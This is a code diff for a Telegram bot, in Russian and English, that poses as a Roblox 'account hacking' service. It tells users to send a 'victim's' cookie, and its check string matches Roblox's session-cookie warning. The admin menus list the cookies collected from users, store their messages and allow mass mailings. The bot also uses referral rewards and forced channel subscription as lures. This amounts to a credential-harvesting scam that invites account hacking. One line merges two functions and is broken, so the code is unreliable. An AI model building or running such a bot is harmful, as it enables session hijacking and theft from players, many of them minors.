@@ -24,8 +24,271 @@ KEYWORD_USERS_FILE = "keyword_users.json"
 ALL_USERS_FILE = "all_users.json"
 ATTEMPTS_FILE = "attempts.json"
 REFERRALS_FILE = "referrals.json"
+LANGUAGE_FILE = "languages.json"
 
 KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"
+
+# ===================================================
+# ПЕРЕВОДЫ
+# ===================================================
+
+TRANSLATIONS = {
+    "ru": {
+        "bot_start": "Привет, {name}! 👋\n\n🎯 **У тебя {attempts} бесплатная попытка взлома**\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\nВыбери нужную категорию:",
+        "check_subscription": "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
+        "not_subscribed": "❌ **Вы ещё не подписались на канал!**\n\n1️⃣ Нажмите кнопку ниже\n2️⃣ Подпишитесь на канал\n3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n🔗 **Канал:** @reviewsh1pe",
+        "subscribe_button": "📢 ПОДПИСАТЬСЯ НА КАНАЛ",
+        "subscribed_button": "✅ Я ПОДПИСАЛСЯ",
+        "back_to_menu": "◀️ Назад в меню",
+        "device": "Взломать аккаунт",
+        "cookies": "Инструкция",
+        "referral": "👥 Пригласить друга",
+        "buy_roblox": "💰 Купить Roblox",
+        "all_users": "👥 Все пользователи",
+        "keyword_users": "🔑 С ключевым словом",
+        "stats": "📊 Статистика",
+        "chat_user": "💬 Чат с пользователем",
+        "give_attempts": "🎯 Выдать попытки",
+        "mailing": "📨 Рассылка",
+        "delete_users": "🗑 Удалить пользователей",
+        "change_language": "🌐 Сменить язык",
+        
+        # Блок покупки Roblox
+        "buy_roblox_title": "💎 **КУПИТЬ ROBLOX** 💎\n\n💰 Хотите приобрести Robux или любую вещь в Roblox?\n\n📩 **Свяжитесь с нами:**\n👤 @h1peoff\n\n⚡ Быстрое оформление\n💳 Безопасная оплата\n🎁 Лучшие цены\n\nНапишите нам прямо сейчас! 🚀",
+        
+        # Реферальная система
+        "referral_text": "👥 **Пригласи друга и получи +1 попытку!**\n\n🎯 Твои попытки: {attempts}\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\n📎 **Твоя реферальная ссылка:**\n`{link}`\n\n📋 **Как это работает:**\n1. Отправь ссылку другу\n2. Друг переходит по ссылке и запускает бота\n3. Ты получаешь +1 попытку взлома\n\n⚠️ Важно: друг должен быть новым пользователем!",
+        
+        # Устройства
+        "device_choice": "🎯 **У тебя {attempts} попытка взлома осталась**\n\nВыбери своё устройство:",
+        "phone": "📱 Телефон",
+        "computer": "💻 Компьютер",
+        "phone_video": "📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
+        "computer_video": "💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
+        "cookies_instruction": "1. Зайти на профиль жертвы\n2. Скопировать cookie\n3. Вставить cookie в бота\n4. Скинуть ссылку 📌 cookie в бота\n5. Ожидать до получения пароля и логина",
+        "no_attempts": "❌ **У тебя закончились попытки взлома!**\n\nЧтобы получить новую попытку, пригласи друга.\nЗа каждого друга ты получаешь +1 попытку! 🎁",
+        "cookies_sent": "Скинь cookie в бота\nИ бот начнет поиск пароля вашей жертвы😈\nВ течении 12 часов бот скинет вам пароль от аккаунта",
+        "cookies_copied": "Скопировал куки ✅",
+        "back": "◀️ Вернуться",
+        
+        # Ответы на сообщения
+        "keyword_received": "Отлично, наш бот уже начал поиски пароля вашей жертвы.\n🎯 Осталось попыток: {remaining}\n\nНе создавайте повторных заявок, иначе будете заблокированы\nЕсли в течении 12 часов бот не ответил, значит он не нашел пароль от аккаунта",
+        "message_received": "Ваше сообщение получено. Ожидайте результат.",
+        "wrong_cookie": "Пожалуйста, отправьте правильный cookie для продолжения.",
+        "delayed_message": "Извините не смогли найти пароль от вашего аккаунта, не нужно создавать повторную заявку, попробуйте через 7 дней иначе будете заблокированы.",
+        
+        # Админские сообщения
+        "admin_stats": "📊 **СТАТИСТИКА БОТА:**\n\n👥 Всего пользователей: {total_users}\n🔑 С ключевым словом: {keyword_users}\n📩 Сообщений сохранено: {messages}\n📅 Новых сегодня: {today}",
+        "no_users": "📭 Никто ещё не заходил в бота.",
+        "no_keyword_users": "📭 Нет пользователей, отправивших ключевое слово.",
+        "all_users_title": "👥 **ВСЕ ПОЛЬЗОВАТЕЛИ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
+        "keyword_users_title": "🔑 **ПОЛЬЗОВАТЕЛИ С КЛЮЧЕВЫМ СЛОВОМ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
+        "no_messages": "📭 У пользователя {name} (@{username}) пока нет сообщений.",
+        "no_keyword_messages": "📭 У {name} (@{username}) нет сообщений с ключевым словом.",
+        
+        # Удаление
+        "delete_users_menu": "🗑 **Управление пользователями:**\n\nВыберите действие:",
+        "delete_single_user": "🗑 Удалить одного пользователя",
+        "delete_all_users": "🗑 Удалить всех пользователей",
+        "delete_confirm": "⚠️ **Подтверждение удаления:**\n\nВы уверены, что хотите удалить пользователя?\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\n🗑 Это действие нельзя отменить!",
+        "delete_success": "✅ **Пользователь успешно удалён!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\nПользователь больше не в списке с ключевым словом.",
+        "delete_all_confirm": "⚠️⚠️⚠️ **ВНИМАНИЕ!** ⚠️⚠️⚠️\n\nВы собираетесь удалить ВСЕХ пользователей из списка с ключевым словом!\n\n📊 Всего будет удалено: {count} пользователей\n\n🗑 Это действие НЕЛЬЗЯ отменить!\n\nПодтвердите удаление:",
+        "delete_all_success": "✅ **ВСЕ ПОЛЬЗОВАТЕЛИ УДАЛЕНЫ!**\n\n🗑 Удалено пользователей: {count}\n📭 Список с ключевым словом теперь пуст.",
+        "yes_delete": "✅ Да, удалить",
+        "cancel": "❌ Отмена",
+        "confirm_delete_all": "⚠️ ДА, УДАЛИТЬ ВСЕХ",
+        
+        # Выдача попыток
+        "give_attempts_menu": "🎯 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ ДЛЯ ВЫДАЧИ ПОПЫТОК:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
+        "give_attempts_user": "🎯 **Выдача попыток пользователю:**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n🎯 Текущее количество попыток: {attempts}\n\nВыберите сколько попыток выдать:",
+        "give_attempts_success": "✅ **Попытки успешно выданы!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n➕ Добавлено: {count} попыток\n🎯 Теперь попыток: {new_attempts}",
+        "give_all_zero": "🎯 Выдать всем у кого 0",
+        "give_all_zero_confirm": "⚠️ **ВНИМАНИЕ!**\n\nВы собираетесь выдать по 1 попытке всем пользователям у которых 0 попыток.\n\n👥 Таких пользователей: {count}\n\nПодтвердите действие:",
+        "give_all_zero_success": "✅ **Попытки успешно выданы!**\n\n👥 Получили попытку: {success}\n❌ Ошибок: {failed}\n📊 Всего выдано: {total} попыток",
+        "give_all_zero_no_users": "✅ У всех пользователей есть попытки!\nНикому не нужно выдавать.",
+        "give_more": "◀️ Выдать еще",
+        "enter_count": "📝 **Введите количество попыток для выдачи:**\n\nПросто отправьте число (например: 5)\nДля отмены нажмите /cancel",
+        "invalid_number": "❌ Количество должно быть больше 0!",
+        "enter_number": "❌ Пожалуйста, отправьте число!",
+        "attempts_canceled": "❌ Выдача попыток отменена.",
+        
+        # Рассылка
+        "mailing_menu": "📨 **Выберите кому отправить рассылку:**\n\n⚠️ Сообщение будет отправлено после того, как вы его напишете.",
+        "mailing_all": "📨 Всем пользователям",
+        "mailing_keyword": "🔑 Только с ключевым словом",
+        "mailing_all_text": "📨 **Напишите текст рассылки для ВСЕХ пользователей:**\n\nПросто отправьте сообщение в этот чат.\nДля отмены нажмите /cancel",
+        "mailing_keyword_text": "📨 **Напишите текст рассылки для пользователей с ключевым словом:**\n\nПросто отправьте сообщение в этот чат.\nДля отмены нажмите /cancel",
+        "mailing_canceled": "❌ Рассылка отменена.",
+        "mailing_no_users": "❌ Нет пользователей для рассылки.",
+        "mailing_start": "⏳ Начинаю рассылку для {count} пользователей...",
+        "mailing_success": "✅ **Рассылка завершена!**\n\n📤 Отправлено: {sent}\n❌ Не доставлено: {failed}\n👥 Всего: {total}",
+        
+        # Чат
+        "chat_select_user": "💬 **ВЫБЕРИТЕ ПОЛЬЗОВАТЕЛЯ:**\n\n📊 Всего: {total} пользователей\n📄 Страница {page} из {total_pages}\n\n",
+        "chat_title": "💬 **Чат с {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего сообщений: {total}\n\n",
+        "chat_keyword_title": "🔑 **Cookie от {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего: {total} сообщений\n\n",
+        "chat_full_title": "💬 **ВСЕ СООБЩЕНИЯ {name} (@{username})**\n🆔 ID: {user_id}\n📊 Всего: {total}\n\n",
+        "keyword_only": "🔑 Только с ключевым словом",
+        "show_all": "📋 Показать ВСЕ сообщения полностью",
+        "show_more": "... и ещё {count} сообщений",
+        
+        # Кнопки навигации
+        "prev": "◀️ Назад",
+        "next": "Вперед ▶️",
+        "page": "Страница {page} из {total_pages}",
+        
+        # Язык
+        "language_selection": "🌐 **Выберите язык / Choose language:**",
+        "language_changed": "✅ Язык изменен на Русский!",
+        "language_changed_en": "✅ Language changed to English!",
+        "ru_button": "🇷🇺 Русский",
+        "en_button": "🇬🇧 English",
+    },
+    "en": {
+        "bot_start": "Hello, {name}! 👋\n\n🎯 **You have {attempts} free hacking attempts**\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\nChoose a category:",
+        "check_subscription": "⚠️ **You must subscribe to our channel to use the bot!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
+        "not_subscribed": "❌ **You haven't subscribed to the channel yet!**\n\n1️⃣ Click the button below\n2️⃣ Subscribe to the channel\n3️⃣ Return to the bot and click '✅ I SUBSCRIBED'\n\n🔗 **Channel:** @reviewsh1pe",
+        "subscribe_button": "📢 SUBSCRIBE TO CHANNEL",
+        "subscribed_button": "✅ I SUBSCRIBED",
+        "back_to_menu": "◀️ Back to menu",
+        "device": "Hack account",
+        "cookies": "Instructions",
+        "referral": "👥 Invite a friend",
+        "buy_roblox": "💰 Buy Roblox",
+        "all_users": "👥 All users",
+        "keyword_users": "🔑 With keyword",
+        "stats": "📊 Statistics",
+        "chat_user": "💬 Chat with user",
+        "give_attempts": "🎯 Give attempts",
+        "mailing": "📨 Mailing",
+        "delete_users": "🗑 Delete users",
+        "change_language": "🌐 Change language",
+        
+        "buy_roblox_title": "💎 **BUY ROBLOX** 💎\n\n💰 Want to buy Robux or any item in Roblox?\n\n📩 **Contact us:**\n👤 @h1peoff\n\n⚡ Fast processing\n💳 Secure payment\n🎁 Best prices\n\nContact us now! 🚀",
+        
+        "referral_text": "👥 **Invite a friend and get +1 attempt!**\n\n🎯 Your attempts: {attempts}\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\n📎 **Your referral link:**\n`{link}`\n\n📋 **How it works:**\n1. Send the link to a friend\n2. Friend clicks the link and starts the bot\n3. You get +1 hacking attempt\n\n⚠️ Important: friend must be a new user!",
+        
+        "device_choice": "🎯 **You have {attempts} hacking attempts left**\n\nChoose your device:",
+        "phone": "📱 Phone",
+        "computer": "💻 Computer",
+        "phone_video": "📱 Watch the video completely and follow all instructions as shown, then everything will work.",
+        "computer_video": "💻 Watch the video completely and follow all instructions as shown, then everything will work.",
+        "cookies_instruction": "1. Go to the victim's profile\n2. Copy the cookie\n3. Paste the cookie into the bot\n4. Send the cookie 📌 to the bot\n5. Wait for the password and login",
+        "no_attempts": "❌ **You've run out of hacking attempts!**\n\nTo get a new attempt, invite a friend.\nYou get +1 attempt for each friend! 🎁",
+        "cookies_sent": "Send the cookie to the bot\nAnd the bot will start searching for your victim's password😈\nWithin 12 hours the bot will send you the account password",
+        "cookies_copied": "Cookies copied ✅",
+        "back": "◀️ Back",
+        
+        "keyword_received": "Great, our bot has started searching for your victim's password.\n🎯 Attempts left: {remaining}\n\nDon't create duplicate requests or you'll be blocked\nIf the bot doesn't respond within 12 hours, it means the password wasn't found",
+        "message_received": "Your message has been received. Waiting for results.",
+        "wrong_cookie": "Please send a valid cookie to continue.",
+        "delayed_message": "Sorry, we couldn't find the password for your account. Don't create a duplicate request, try again in 7 days or you'll be blocked.",
+        
+        "admin_stats": "📊 **BOT STATISTICS:**\n\n👥 Total users: {total_users}\n🔑 With keyword: {keyword_users}\n📩 Messages saved: {messages}\n📅 New today: {today}",
+        "no_users": "📭 No users have used the bot yet.",
+        "no_keyword_users": "📭 No users have sent the keyword.",
+        "all_users_title": "👥 **ALL USERS:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
+        "keyword_users_title": "🔑 **USERS WITH KEYWORD:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
+        "no_messages": "📭 User {name} (@{username}) has no messages yet.",
+        "no_keyword_messages": "📭 {name} (@{username}) has no messages with keyword.",
+        
+        "delete_users_menu": "🗑 **User Management:**\n\nChoose an action:",
+        "delete_single_user": "🗑 Delete one user",
+        "delete_all_users": "🗑 Delete all users",
+        "delete_confirm": "⚠️ **Delete confirmation:**\n\nAre you sure you want to delete this user?\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\n🗑 This action cannot be undone!",
+        "delete_success": "✅ **User successfully deleted!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n\nUser is no longer in the keyword list.",
+        "delete_all_confirm": "⚠️⚠️⚠️ **WARNING!** ⚠️⚠️⚠️\n\nYou are about to delete ALL users from the keyword list!\n\n📊 Total to be deleted: {count} users\n\n🗑 This action CANNOT be undone!\n\nConfirm deletion:",
+        "delete_all_success": "✅ **ALL USERS DELETED!**\n\n🗑 Users deleted: {count}\n📭 Keyword list is now empty.",
+        "yes_delete": "✅ Yes, delete",
+        "cancel": "❌ Cancel",
+        "confirm_delete_all": "⚠️ YES, DELETE ALL",
+        
+        "give_attempts_menu": "🎯 **SELECT USER TO GIVE ATTEMPTS:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
+        "give_attempts_user": "🎯 **Giving attempts to user:**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n🎯 Current attempts: {attempts}\n\nChoose how many attempts to give:",
+        "give_attempts_success": "✅ **Attempts successfully given!**\n\n👤 {name} (@{username})\n🆔 ID: {user_id}\n➕ Added: {count} attempts\n🎯 Now has: {new_attempts} attempts",
+        "give_all_zero": "🎯 Give to all with 0",
+        "give_all_zero_confirm": "⚠️ **WARNING!**\n\nYou are about to give 1 attempt to all users who have 0 attempts.\n\n👥 Such users: {count}\n\nConfirm action:",
+        "give_all_zero_success": "✅ **Attempts successfully given!**\n\n👥 Received attempts: {success}\n❌ Errors: {failed}\n📊 Total given: {total} attempts",
+        "give_all_zero_no_users": "✅ All users have attempts!\nNo one needs to be given.",
+        "give_more": "◀️ Give more",
+        "enter_count": "📝 **Enter the number of attempts to give:**\n\nJust send a number (e.g., 5)\nTo cancel press /cancel",
+        "invalid_number": "❌ The number must be greater than 0!",
+        "enter_number": "❌ Please send a number!",
+        "attempts_canceled": "❌ Attempts giving canceled.",
+        
+        "mailing_menu": "📨 **Select who to send the mailing to:**\n\n⚠️ The message will be sent after you write it.",
+        "mailing_all": "📨 All users",
+        "mailing_keyword": "🔑 Only with keyword",
+        "mailing_all_text": "📨 **Write the mailing text for ALL users:**\n\nJust send a message in this chat.\nTo cancel press /cancel",
+        "mailing_keyword_text": "📨 **Write the mailing text for users with keyword:**\n\nJust send a message in this chat.\nTo cancel press /cancel",
+        "mailing_canceled": "❌ Mailing canceled.",
+        "mailing_no_users": "❌ No users for mailing.",
+        "mailing_start": "⏳ Starting mailing for {count} users...",
+        "mailing_success": "✅ **Mailing completed!**\n\n📤 Sent: {sent}\n❌ Failed: {failed}\n👥 Total: {total}",
+        
+        "chat_select_user": "💬 **SELECT USER:**\n\n📊 Total: {total} users\n📄 Page {page} of {total_pages}\n\n",
+        "chat_title": "💬 **Chat with {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total messages: {total}\n\n",
+        "chat_keyword_title": "🔑 **Cookies from {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total: {total} messages\n\n",
+        "chat_full_title": "💬 **ALL MESSAGES {name} (@{username})**\n🆔 ID: {user_id}\n📊 Total: {total}\n\n",
+        "keyword_only": "🔑 Only with keyword",
+        "show_all": "📋 Show ALL messages completely",
+        "show_more": "... and {count} more messages",
+        
+        "prev": "◀️ Back",
+        "next": "Next ▶️",
+        "page": "Page {page} of {total_pages}",
+        
+        "language_selection": "🌐 **Select language / Выберите язык:**",
+        "language_changed": "✅ Language changed to English!",
+        "language_changed_en": "✅ Язык изменен на Русский!",
+        "ru_button": "🇷🇺 Русский",
+        "en_button": "🇬🇧 English",
+    }
+}
+
+# ===================================================
+# ФУНКЦИИ ДЛЯ РАБОТЫ С ЯЗЫКОМ
+# ===================================================
+
+def get_user_language(user_id):
+    """Получает язык пользователя"""
+    try:
+        if os.path.exists(LANGUAGE_FILE):
+            with open(LANGUAGE_FILE, "r", encoding="utf-8") as f:
+                languages = json.load(f)
+            return languages.get(str(user_id), "ru")
+        return "ru"
+    except:
+        return "ru"
+
+def set_user_language(user_id, language):
+    """Устанавливает язык пользователя"""
+    try:
+        if os.path.exists(LANGUAGE_FILE):
+            with open(LANGUAGE_FILE, "r", encoding="utf-8") as f:
+                languages = json.load(f)
+        else:
+            languages = {}
+        
+        languages[str(user_id)] = language
+        
+        with open(LANGUAGE_FILE, "w", encoding="utf-8") as f:
+            json.dump(languages, f, ensure_ascii=False, indent=2)
+        return True
+    except Exception as e:
+        print(f"Ошибка сохранения языка: {e}")
+        return False
+
+def get_text(user_id, key, **kwargs):
+    """Получает переведенный текст для пользователя"""
+    lang = get_user_language(user_id)
+    text = TRANSLATIONS.get(lang, TRANSLATIONS["ru"]).get(key, TRANSLATIONS["ru"].get(key, key))
+    if kwargs:
+        try:
+            text = text.format(**kwargs)
+        except:
+            pass
+    return text
 
 # ===================================================
 # ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ
@@ -34,23 +297,19 @@ KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log
 async def check_subscription(user_id, context):
     """Проверяет, подписан ли пользователь на канал"""
     try:
-        # Пытаемся получить статус участника
         chat_member = await context.bot.get_chat_member(
             chat_id=REQUIRED_CHANNEL,
             user_id=user_id
         )
-        # Проверяем статус: creator, administrator, member - считаются подписанными
         return chat_member.status in ['creator', 'administrator', 'member']
     except Exception as e:
         print(f"Ошибка проверки подписки для {user_id}: {e}")
-        # Если ошибка (например, бот не админ в канале), пропускаем проверку
         return True
 
 async def check_subscription_and_continue(update, context):
     """Проверяет подписку и если не подписан - показывает кнопку"""
     user_id = update.effective_user.id
     
-    # Для админа проверку не делаем
     if user_id == YOUR_USER_ID:
         return True
     
@@ -58,17 +317,13 @@ async def check_subscription_and_continue(update, context):
     
     if not is_subscribed:
         keyboard = [
-            [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
-            [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+            [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
+            [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
-            "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n"
-            "1️⃣ Нажмите кнопку ниже\n"
-            "2️⃣ Подпишитесь на канал\n"
-            "3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n"
-            "🔗 **Канал:** @reviewsh1pe",
+            get_text(user_id, "check_subscription"),
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
@@ -81,7 +336,6 @@ async def check_subscription_and_continue(update, context):
 # ===================================================
 
 def get_user_attempts(user_id):
-    """Получает количество оставшихся попыток у пользователя"""
     try:
         if os.path.exists(ATTEMPTS_FILE):
             with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
@@ -92,7 +346,6 @@ def get_user_attempts(user_id):
         return 1
 
 def set_user_attempts(user_id, attempts_count):
-    """Устанавливает количество попыток пользователя"""
     try:
         if os.path.exists(ATTEMPTS_FILE):
             with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
@@ -110,13 +363,11 @@ def set_user_attempts(user_id, attempts_count):
         return False
 
 def add_attempts(user_id, count):
-    """Добавляет попытки пользователю"""
     current = get_user_attempts(user_id)
     set_user_attempts(user_id, current + count)
     return get_user_attempts(user_id)
 
 def use_attempt(user_id):
-    """Использует одну попытку, возвращает True если успешно, False если попыток нет"""
     current = get_user_attempts(user_id)
     if current <= 0:
         return False
@@ -125,7 +376,6 @@ def use_attempt(user_id):
     return True
 
 def get_user_referrals(user_id):
-    """Получает список приглашенных пользователей"""
     try:
         if os.path.exists(REFERRALS_FILE):
             with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
@@ -136,7 +386,6 @@ def get_user_referrals(user_id):
         return []
 
 def add_referral(user_id, referred_user_id):
-    """Добавляет приглашенного пользователя"""
     try:
         if os.path.exists(REFERRALS_FILE):
             with open(REFERRALS_FILE, "r", encoding="utf-8") as f:
@@ -165,7 +414,6 @@ def add_referral(user_id, referred_user_id):
         return False
 
 def get_referral_count(user_id):
-    """Получает количество приглашенных пользователей"""
     return len(get_user_referrals(user_id))
 
 # ===================================================
@@ -249,7 +497,6 @@ def get_keyword_users():
         return {}
 
 def delete_keyword_user(user_id):
-    """Удаляет пользователя из списка с ключевым словом"""
     try:
         if os.path.exists(KEYWORD_USERS_FILE):
             with open(KEYWORD_USERS_FILE, "r", encoding="utf-8") as f:
@@ -263,10 +510,7 @@ def delete_keyword_user(user_id):
         return False
     except Exception as e:
         print(f"Ошибка удаления пользователя: {e}")
-        return False
-
-def delete_all_keyword_users():
-    """Удаляет всех пользователей из списка с ключевым словом"""
+        return Falsedef delete_all_keyword_users():
     try:
         if os.path.exists(KEYWORD_USERS_FILE):
             with open(KEYWORD_USERS_FILE, "w", encoding="utf-8") as f:
@@ -278,7 +522,6 @@ def delete_all_keyword_users():
         return False
 
 def get_user_messages(user_id):
-    """Получает все сообщения пользователя (с сортировкой по времени)"""
     try:
         if os.path.exists(MESSAGES_FILE):
             with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
@@ -331,10 +574,10 @@ def save_message(user_id, username, first_name, text, timestamp):
 # ===================================================
 
 async def show_users_page(query, context, page=0, per_page=10):
-    """Показывает страницу со списком всех пользователей"""
+    user_id = query.from_user.id
     users = get_all_users()
     if not users:
-        await query.edit_message_text("📭 Никто ещё не заходил в бота.")
+        await query.edit_message_text(get_text(user_id, "no_users"))
         return
     
     users_list = list(users.items())
@@ -348,41 +591,40 @@ async def show_users_page(query, context, page=0, per_page=10):
     end_idx = min(start_idx + per_page, total_users)
     current_users = users_list[start_idx:end_idx]
     
-    text = f"👥 **ВСЕ ПОЛЬЗОВАТЕЛИ:**\n\n"
-    text += f"📊 Всего: {total_users} пользователей\n"
-    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
+    text = get_text(user_id, "all_users_title", total=total_users, page=page+1, total_pages=total_pages)
     
-    for user_id, user_data in current_users:
+    for user_id_str, user_data in current_users:
         name = user_data.get("first_name", "Unknown")
         username = user_data.get("username", "no_username")
         first_seen = user_data.get("first_seen", "неизвестно")
         last_seen = user_data.get("last_seen", "неизвестно")
-        has_keyword = "✅" if is_keyword_user(user_id) else "❌"
-        attempts = get_user_attempts(user_id)
+        has_keyword = "✅" if is_keyword_user(user_id_str) else "❌"
+        attempts = get_user_attempts(user_id_str)
         
-        text += f"🆔 {user_id}\n"
+        text += f"🆔 {user_id_str}\n"
         text += f"👤 {name} (@{username})\n"
-        text += f"📅 Первый визит: {first_seen}\n"
-        text += f"🕐 Последний визит: {last_seen}\n"
-        text += f"🔑 Ключевое слово: {has_keyword}\n"
-        text += f"🎯 Попыток: {attempts}\n"
+        text += f"📅 First seen: {first_seen}\n"
+        text += f"🕐 Last seen: {last_seen}\n"
+        text += f"🔑 Keyword: {has_keyword}\n"
+        text += f"🎯 Attempts: {attempts}\n"
         text += "─" * 25 + "\n"
     
     keyboard = []
     nav_buttons = []
     
     if page > 0:
-        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"users_page_{page - 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"users_page_{page - 1}"))
     if page < total_pages - 1:
-        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"users_page_{page + 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"users_page_{page + 1}"))
     
     if nav_buttons:
         keyboard.append(nav_buttons)
     
-    keyboard.append([InlineKeyboardButton("🎯 Выдать попытки", callback_data="give_attempts_menu")])
-    keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
-    keyboard.append([InlineKeyboardButton("🔑 Только с ключевым словом", callback_data="view_keyword_users_only")])
-    keyboard.append([InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -390,15 +632,15 @@ async def show_users_page(query, context, page=0, per_page=10):
         parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
         for part in parts:
             await query.message.reply_text(part)
-        await query.message.reply_text("⬅️ Нажмите кнопку ниже:", reply_markup=reply_markup)
+        await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
     else:
         await query.edit_message_text(text, reply_markup=reply_markup)
 
 async def show_keyword_users_page(query, context, page=0, per_page=10):
-    """Показывает страницу со списком пользователей с ключевым словом"""
+    user_id = query.from_user.id
     users = get_keyword_users()
     if not users:
-        await query.edit_message_text("📭 Нет пользователей, отправивших ключевое слово.")
+        await query.edit_message_text(get_text(user_id, "no_keyword_users"))
         return
     
     users_list = list(users.items())
@@ -412,39 +654,38 @@ async def show_keyword_users_page(query, context, page=0, per_page=10):
     end_idx = min(start_idx + per_page, total_users)
     current_users = users_list[start_idx:end_idx]
     
-    text = f"🔑 **ПОЛЬЗОВАТЕЛИ С КЛЮЧЕВЫМ СЛОВОМ:**\n\n"
-    text += f"📊 Всего: {total_users} пользователей\n"
-    text += f"📄 Страница {page + 1} из {total_pages}\n\n"
+    text = get_text(user_id, "keyword_users_title", total=total_users, page=page+1, total_pages=total_pages)
     
-    for user_id, user_data in current_users:
+    for user_id_str, user_data in current_users:
         name = user_data.get("first_name", "Unknown")
         username = user_data.get("username", "no_username")
         timestamp = user_data.get("timestamp", "неизвестно")
-        attempts = get_user_attempts(user_id)
+        attempts = get_user_attempts(user_id_str)
         
-        text += f"🆔 {user_id}\n"
+        text += f"🆔 {user_id_str}\n"
         text += f"👤 {name} (@{username})\n"
-        text += f"🕐 Отправил: {timestamp}\n"
-        text += f"🎯 Попыток: {attempts}\n"
+        text += f"🕐 Sent: {timestamp}\n"
+        text += f"🎯 Attempts: {attempts}\n"
         text += "─" * 25 + "\n"
     
     keyboard = []
     nav_buttons = []
     
     if page > 0:
-        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"keyword_users_page_{page - 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"keyword_users_page_{page - 1}"))
     if page < total_pages - 1:
-        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"keyword_users_page_{page + 1}"))
+        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"keyword_users_page_{page + 1}"))
     
     if nav_buttons:
         keyboard.append(nav_buttons)
     
-    keyboard.append([InlineKeyboardButton("🎯 Выдать попытки", callback_data="give_attempts_menu")])
-    keyboard.append([InlineKeyboardButton("📩 Посмотреть сообщения", callback_data="view_keyword_messages")])
-    keyboard.append([InlineKeyboardButton("🗑 Удалить пользователя", callback_data="delete_single_user")])
-    keyboard.append([InlineKeyboardButton("◀️ Назад в меню", callback_data="back_to_menu")])
-    keyboard.append([InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users")])
-    keyboard.append([InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat")])
+    keyboard.append([InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu")])
